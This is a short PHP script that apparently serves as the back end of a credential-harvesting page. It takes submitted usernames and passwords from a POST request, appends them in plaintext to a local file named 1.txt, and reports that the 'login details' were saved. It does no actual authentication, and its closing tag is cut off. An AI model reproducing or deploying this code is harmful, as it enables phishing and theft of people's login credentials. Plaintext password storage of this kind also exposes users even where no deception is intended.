<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Open or create the file for writing
    $file = fopen("1.txt", "a");

    // Check if the file was successfully opened
    if ($file) {
        // Write login details to the file
        fwrite($file, "Username: " . $username . ", Password: " . $password . "\n");
        fclose($file);
        echo "Login details saved successfully!";
    } else {
        echo "Error: Unable to open file.";
    }
} else {
    // Handle invalid request
    echo "Invalid request";
}
?
